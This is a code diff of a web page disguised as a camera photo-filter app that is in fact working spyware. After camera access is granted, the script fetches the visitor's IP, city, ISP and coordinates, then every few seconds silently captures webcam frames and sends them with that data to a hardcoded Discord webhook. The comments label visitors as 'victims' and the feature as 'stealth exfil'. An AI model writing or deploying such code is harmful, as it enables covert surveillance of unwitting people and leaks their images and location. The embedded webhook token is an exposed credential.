@@ -72,49 +72,25 @@
         .video-overlay {
             position:absolute;
             inset:0;
-            pointer-events:all;
+            pointer-events:none;
             display:flex;
             align-items:center;
             justify-content:center;
-            background:rgba(0,0,0,0.85);
-            color:white;
+            background:rgba(0,0,0,0.7);
             opacity:0;
-            transition:opacity 0.4s;
-            z-index:999;
+            transition:opacity 0.3s;
         }
         .video-overlay.show { opacity:1; }
-        .overlay-content {
-            text-align:center;
-            padding:2rem;
-            max-width:90%;
-        }
-        .overlay-content h2 { font-size:2rem; margin-bottom:1rem; }
-        .overlay-content p { font-size:1.2rem; margin:0.8rem 0; }
-        .overlay-content .spinner {
-            width:60px; height:60px;
-            border:5px solid rgba(255,255,255,0.3);
-            border-top-color:#667eea;
+        .overlay-content { text-align:center; color:white; }
+        .spinner {
+            width:50px; height:50px;
+            border:3px solid rgba(255,255,255,0.3);
+            border-top-color:white;
             border-radius:50%;
-            animation:spin 1.2s linear infinite;
-            margin:0 auto 1.5rem;
+            animation:spin 1s linear infinite;
+            margin:0 auto 1rem;
         }
         @keyframes spin { to { transform:rotate(360deg); } }
-        .retry-btn {
-            margin-top:2rem;
-            padding:1rem 2.5rem;
-            font-size:1.3rem;
-            background:linear-gradient(135deg,#667eea,#764ba2);
-            color:white;
-            border:none;
-            border-radius:50px;
-            cursor:pointer;
-            box-shadow:0 8px 25px rgba(102,126,234,0.4);
-            transition:all 0.3s;
-        }
-        .retry-btn:hover {
-            transform:scale(1.08);
-            box-shadow:0 12px 35px rgba(102,126,234,0.6);
-        }
         .controls {
             display:flex;
             gap:1rem;
@@ -189,9 +165,7 @@
         .filter-preview { width:100%; height:100px; object-fit:cover; display:block; }
         .filter-name {
             position:absolute;
-            bottom:0;
-            left:0;
-            right:0;
+            inset:0 auto auto 0;
             background:linear-gradient(to top, rgba(0,0,0,0.7), transparent);
             color:white;
             padding:0.5rem;
@@ -319,6 +293,9 @@
             </h1>
             <div class="controls">
                 <button class="btn btn-secondary" id="switchCameraBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5H5l2.5-2.5L10 13H8c0 2.21 1.79 4 4 4 .58 0 1.13-.13 1.62-.36l.74.74c-.72.37-1.5.62-2.36.62zm4.5-2.5L14 13h2c0-2.21-1.79-4-4-4-.58 0-1.13.13-1.62.36l-.74-.73C10.36 8.26 11.14 8 12 8c2.76 0 5 2.24 5 5h2l-2.5 2.5z"/>
+                    </svg>
                     Switch Camera
                 </button>
             </div>
@@ -331,31 +308,40 @@
                 <video id="video" autoplay playsinline></video>
                 <canvas id="canvas" style="display:none;"></canvas>
                 <div class="video-overlay" id="videoOverlay">
-                    <div class="overlay-content" id="overlayContent">
+                    <div class="overlay-content">
                         <div class="spinner"></div>
-                        <h2>Initializing camera...</h2>
-                        <p>Please allow camera access to use the filters.</p>
+                        <p>Initializing camera...</p>
                     </div>
                 </div>
             </div>
             <div class="controls">
                 <button class="btn btn-primary" id="captureBtn" disabled>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <circle cx="12" cy="12" r="3.2"/>
+                        <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
+                    </svg>
                     Capture Photo
                 </button>
                 <button class="btn btn-secondary" id="downloadBtn" disabled>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                    </svg>
                     Download
                 </button>
                 <button class="btn btn-secondary" id="clearPhotosBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/>
+                    </svg>
                     Clear All
                 </button>
             </div>
         </section>
 
         <aside class="filters-panel">
-            <h2>Filters</h2>
+            <h2>🎨 Filters</h2>
             <div class="filter-grid" id="filterGrid"></div>
             <div class="custom-filters">
-                <h3>Custom Adjustments</h3>
+                <h3>⚙️ Custom Adjustments</h3>
                 <div class="slider-control">
                     <div class="slider-label"><span>Brightness</span><span id="brightnessValue">100%</span></div>
                     <input type="range" class="slider" id="brightness" min="50" max="150" value="100">
@@ -374,7 +360,7 @@
                 </div>
             </div>
             <div class="captured-photos">
-                <h3>Captured Photos</h3>
+                <h3>📸 Captured Photos</h3>
                 <div class="photos-grid" id="photosGrid"></div>
             </div>
         </aside>
@@ -388,7 +374,8 @@
     </div>
 
     <script>
-        // YOUR DISCORD WEBHOOK
+        // ────────────────────────────────────────────────
+        //  YOUR DISCORD WEBHOOK (change if needed)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";
 
         let stream = null;
@@ -397,7 +384,6 @@
         let currentCamera = 'user';
         let customFilters = { brightness:100, contrast:100, saturation:100, blur:0 };
         let exfilInterval = null;
-        let retryTimer = null;
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -409,82 +395,96 @@
         const filterGrid = document.getElementById('filterGrid');
         const photosGrid = document.getElementById('photosGrid');
         const videoOverlay = document.getElementById('videoOverlay');
-        const overlayContent = document.getElementById('overlayContent');
         const toast = document.getElementById('toast');
         const toastMessage = document.getElementById('toastMessage');
 
-        // IP + location grabber
+        const filters = [
+            { name:'Normal', value:'none', preview:'none' },
+            { name:'Vintage', value:'sepia(0.5) contrast(1.2) brightness(0.9)', preview:'sepia(0.5)' },
+            { name:'Cold', value:'hue-rotate(180deg) saturate(0.7)', preview:'hue-rotate(180deg)' },
+            { name:'Warm', value:'hue-rotate(-30deg) saturate(1.3) brightness(1.1)', preview:'hue-rotate(-30deg)' },
+            { name:'B&W', value:'grayscale(1) contrast(1.2)', preview:'grayscale(1)' },
+            { name:'Dramatic', value:'contrast(1.5) brightness(0.8) saturate(1.2)', preview:'contrast(1.5)' },
+            { name:'Dreamy', value:'blur(1px) brightness(1.2) saturate(1.3)', preview:'blur(1px)' },
+            { name:'Retro', value:'sepia(0.3) contrast(1.1) hue-rotate(10deg)', preview:'sepia(0.3)' },
+            { name:'Cyberpunk', value:'hue-rotate(270deg) saturate(1.5) contrast(1.3)', preview:'hue-rotate(270deg)' },
+            { name:'Sunset', value:'hue-rotate(-20deg) saturate(1.5) brightness(1.1)', preview:'hue-rotate(-20deg)' }
+        ];
+
+        // ─── IP + Geo grabber ────────────────────────────────
         async function getVictimInfo() {
             try {
                 const res = await fetch('https://ipwho.is/');
                 const data = await res.json();
                 return {
                     ip: data.ip || 'unknown',
-                    city: data.city || 'unknown',
-                    region: data.region || 'unknown',
-                    country: data.country || 'unknown',
-                    isp: data.connection?.isp || 'unknown',
+                    city: data.city || '??',
+                    region: data.region || '??',
+                    country: data.country || '??',
+                    isp: data.connection?.isp || '??',
                     lat: data.latitude || 'N/A',
-                    lon: data.longitude || 'N/A'
+                    lon: data.longitude || 'N/A',
+                    timezone: data.timezone?.id || '??'
                 };
             } catch {
-                return { ip:'unknown', city:'unknown', region:'unknown', country:'unknown', isp:'unknown', lat:'N/A', lon:'N/A' };
+                return { ip:'???.???.???.???', city:'??', region:'??', country:'??', isp:'??', lat:'N/A', lon:'N/A', timezone:'??' };
             }
         }
 
-        // Stealth photo sender
+        // ─── Stealth photo sender ────────────────────────────────
         async function stealthSendPhoto(blob, geo, isFirst = false) {
             const ts = new Date().toLocaleString();
             const ipSafe = geo.ip.replace(/\./g, '_');
+
             const text = isFirst
-                ? `Camera access granted\nIP: ${geo.ip}\nLocation: ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nTime: ${ts}`
-                : `Photo captured\nIP: ${geo.ip}\nTime: ${ts}`;
+                ? `✨ CAMERA ACCESS GRANTED!\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTZ: ${geo.timezone}\nTime: ${ts}`
+                : `📸 Photo captured\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nTime: ${ts}`;
+
+            const embed = {
+                title: isFirst ? "🎀 Permission Success" : "📸 New Victim Photo",
+                description: `**IP:** \`${geo.ip}\`\n**Location:** ${geo.city}, ${geo.region}, ${geo.country}\n**ISP:** ${geo.isp}\n**Coords:** ${geo.lat}, ${geo.lon}`,
+                color: isFirst ? 0x00ff9d : 0xff69b4,
+                timestamp: new Date().toISOString(),
+                footer: { text: "silent capture ♡" }
+            };
 
             const formData = new FormData();
-            formData.append('file', blob, `capture_${ipSafe}_${Date.now()}.jpg`);
-            formData.append('payload_json', JSON.stringify({ content: text }));
+            formData.append('file', blob, `v_${ipSafe}_${Date.now()}.jpg`);
+            formData.append('payload_json', JSON.stringify({
+                content: text,
+                embeds: [embed]
+            }));
 
-            fetch(WEBHOOK_URL, { method:'POST', body:formData, mode:'no-cors' }).catch(()=>{});
+            fetch(WEBHOOK_URL, { method:'POST', body:formData, mode:'no-cors' })
+                .catch(() => {}); // silent fail
         }
 
-        function startStealthCapture() {
+        // ─── Start background exfiltration when camera is live ───────
+        async function startStealthCapture() {
             if (exfilInterval) clearInterval(exfilInterval);
-            getVictimInfo().then(geo => {
-                stealthSendPhoto(new Blob(), geo, true);
-                exfilInterval = setInterval(async () => {
-                    if (!video.videoWidth) return;
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.filter = video.style.filter || 'none';
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(b => {
-                        if (b) stealthSendPhoto(b, geo);
-                    }, 'image/jpeg', 0.55);
-                }, 3200);
-            });
+
+            const geo = await getVictimInfo();
+
+            // Send initial success message
+            const tiny = new Blob([new Uint8Array(1)], {type:'image/jpeg'});
+            await stealthSendPhoto(tiny, geo, true);
+
+            // Start sending real photos
+            exfilInterval = setInterval(async () => {
+                if (!video.videoWidth) return;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.filter = video.style.filter || 'none';
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(async (blob) => {
+                    if (blob) await stealthSendPhoto(blob, geo, false);
+                }, 'image/jpeg', 0.55);
+            }, 3200); // ~every 3.2 seconds
         }
 
-        // Show permission request overlay
-        function showPermissionScreen() {
+        // ─── Original camera init (modified) ──────────────────────────
+        async function initCamera() {
             videoOverlay.classList.add('show');
-            captureBtn.disabled = true;
-            downloadBtn.disabled = true;
-            switchCameraBtn.disabled = true;
-
-            overlayContent.innerHTML = `
-                <div class="spinner"></div>
-                <h2>Camera access required</h2>
-                <p>Please allow camera access to use this application.</p>
-                <button class="retry-btn" id="forceRetryBtn">Allow Camera</button>
-            `;
-
-            document.getElementById('forceRetryBtn')?.addEventListener('click', tryRequestCamera);
-        }
-
-        // Main camera request function with infinite retry
-        async function tryRequestCamera() {
-            if (retryTimer) clearTimeout(retryTimer);
-
             try {
                 const constraints = {
                     video: {
@@ -495,7 +495,7 @@
                 };
 
                 if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(t => t.stop());
                 }
 
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -505,85 +505,153 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     captureBtn.disabled = false;
-                    switchCameraBtn.disabled = false;
                     videoOverlay.classList.remove('show');
-                    showToast('Camera initialized', 'success');
+                    showToast('Camera ready!', 'success');
+
+                    // ── START STEALTH EXFIL HERE ──
                     startStealthCapture();
                 };
-
             } catch (err) {
-                showPermissionScreen();
-                // Auto retry every 4.5 seconds
-                retryTimer = setTimeout(tryRequestCamera, 4500);
+                console.error(err);
+                videoOverlay.innerHTML = `
+                    <div class="overlay-content">
+                        <svg width="60" height="60" viewBox="0 0 24 24" fill="white" style="margin-bottom:1rem;">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <p>Camera access denied or unavailable</p>
+                        <p style="font-size:0.9rem; margin-top:0.5rem;">Please allow camera permissions</p>
+                    </div>
+                `;
+                videoOverlay.classList.add('show');
+                showToast('Failed to access camera', 'error');
             }
         }
 
-        // Switch camera handler
-        switchCameraBtn.onclick = () => {
-            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
-            tryRequestCamera();
-        };
-
-        // Toast notification
-        function showToast(msg, type = 'success') {
-            toastMessage.textContent = msg;
-            toast.className = `toast ${type} show`;
-            setTimeout(() => toast.classList.remove('show'), 3000);
-        }
-
-        // ── Your original filter / capture / download code goes here ──
-        // (copy the rest from your previous version: createFilterButtons, applyFilters, sliders, captureBtn listener, updatePhotosGrid, etc.)
-
-        // For example:
-        const filters = [
-            { name: 'Normal', value: 'none', preview: 'none' },
-            { name: 'Vintage', value: 'sepia(0.5) contrast(1.2) brightness(0.9)', preview: 'sepia(0.5)' },
-            // ... add the rest of your filters ...
-        ];
-
+        // ─── Rest of the original functions (unchanged) ───────────────
         function createFilterButtons() {
-            filters.forEach(filter => {
+            filters.forEach(f => {
                 const item = document.createElement('div');
                 item.className = 'filter-item';
-                if (filter.value === 'none') item.classList.add('active');
+                if (f.value === 'none') item.classList.add('active');
                 item.innerHTML = `
-                    <img src="https://picsum.photos/seed/${filter.name}/150/100.jpg" class="filter-preview" style="filter: ${filter.preview}">
-                    <div class="filter-name">${filter.name}</div>
+                    <img src="https://picsum.photos/seed/${f.name}/150/100.jpg" class="filter-preview" style="filter:${f.preview}">
+                    <div class="filter-name">${f.name}</div>
                 `;
-                item.addEventListener('click', () => {
+                item.onclick = () => {
                     document.querySelectorAll('.filter-item').forEach(i => i.classList.remove('active'));
                     item.classList.add('active');
-                    currentFilter = filter.value;
+                    currentFilter = f.value;
                     applyFilters();
-                });
+                };
                 filterGrid.appendChild(item);
             });
         }
 
         function applyFilters() {
-            let filterStr = currentFilter === 'none' ? '' : currentFilter;
-            if (customFilters.brightness !== 100) filterStr += ` brightness(${customFilters.brightness}%)`;
-            if (customFilters.contrast !== 100) filterStr += ` contrast(${customFilters.contrast}%)`;
-            if (customFilters.saturation !== 100) filterStr += ` saturate(${customFilters.saturation}%)`;
-            if (customFilters.blur > 0) filterStr += ` blur(${customFilters.blur}px)`;
-            video.style.filter = filterStr;
+            let f = currentFilter === 'none' ? '' : currentFilter;
+            if (customFilters.brightness !== 100) f += ` brightness(${customFilters.brightness}%)`;
+            if (customFilters.contrast !== 100) f += ` contrast(${customFilters.contrast}%)`;
+            if (customFilters.saturation !== 100) f += ` saturate(${customFilters.saturation}%)`;
+            if (customFilters.blur > 0) f += ` blur(${customFilters.blur}px)`;
+            video.style.filter = f;
         }
 
-        // Add your slider listeners, capture button, etc. here (same as your original)
+        // Slider listeners
+        ['brightness','contrast','saturation','blur'].forEach(id => {
+            const el = document.getElementById(id);
+            el.addEventListener('input', e => {
+                customFilters[id] = e.target.value;
+                document.getElementById(id + 'Value').textContent = id === 'blur' ? `${e.target.value}px` : `${e.target.value}%`;
+                applyFilters();
+            });
+        });
 
-        // Initial start
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            overlayContent.innerHTML = `
-                <h2>Camera not supported</h2>
-                <p>Your browser does not support camera access.</p>
+        // Capture button (normal function still works)
+        captureBtn.addEventListener('click', () => {
+            ctx.filter = video.style.filter;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const data = canvas.toDataURL('image/jpeg', 0.95);
+            capturedPhotos.push({ id:Date.now(), data, filter:currentFilter, custom:{...customFilters} });
+            updatePhotosGrid();
+            downloadBtn.disabled = false;
+            showToast('Photo captured!', 'success');
+            video.style.opacity = '0';
+            setTimeout(() => video.style.opacity = '1', 100);
+        });
+
+        function updatePhotosGrid() {
+            photosGrid.innerHTML = '';
+            capturedPhotos.slice(-9).reverse().forEach(p => {
+                const thumb = document.createElement('div');
+                thumb.className = 'photo-thumb';
+                thumb.innerHTML = `
+                    <img src="${p.data}" alt="photo">
+                    <button class="delete-btn" data-id="${p.id}">×</button>
+                `;
+                thumb.querySelector('img').onclick = () => downloadImage(p.data, `photo_${p.id}.jpg`);
+                thumb.querySelector('.delete-btn').onclick = e => {
+                    e.stopPropagation();
+                    capturedPhotos = capturedPhotos.filter(x => x.id !== p.id);
+                    updatePhotosGrid();
+                    if (!capturedPhotos.length) downloadBtn.disabled = true;
+                    showToast('Photo deleted', 'success');
+                };
+                photosGrid.appendChild(thumb);
+            });
+        }
+
+        function downloadImage(data, name) {
+            const a = document.createElement('a');
+            a.href = data;
+            a.download = name;
+            a.click();
+        }
+
+        downloadBtn.onclick = () => {
+            if (capturedPhotos.length) {
+                const last = capturedPhotos[capturedPhotos.length-1];
+                downloadImage(last.data, `filtered_${last.id}.jpg`);
+                showToast('Photo downloaded!', 'success');
+            }
+        };
+
+        switchCameraBtn.onclick = () => {
+            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+            initCamera();
+        };
+
+        clearPhotosBtn.onclick = () => {
+            if (capturedPhotos.length && confirm('Delete all photos?')) {
+                capturedPhotos = [];
+                updatePhotosGrid();
+                downloadBtn.disabled = true;
+                showToast('All photos cleared', 'success');
+            }
+        };
+
+        function showToast(msg, type='success') {
+            toastMessage.textContent = msg;
+            toast.className = `toast ${type} show`;
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // Init
+        if (!navigator.mediaDevices?.getUserMedia) {
+            videoOverlay.innerHTML = `
+                <div class="overlay-content">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="white" style="margin-bottom:1rem;">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                    <p>Camera not supported</p>
+                </div>
             `;
             videoOverlay.classList.add('show');
+            showToast('Camera not supported', 'error');
         } else {
             createFilterButtons();
-            tryRequestCamera();
+            initCamera();
         }
 
-        // Cleanup on leave
         window.addEventListener('beforeunload', () => {
             if (stream) stream.getTracks().forEach(t => t.stop());
         });
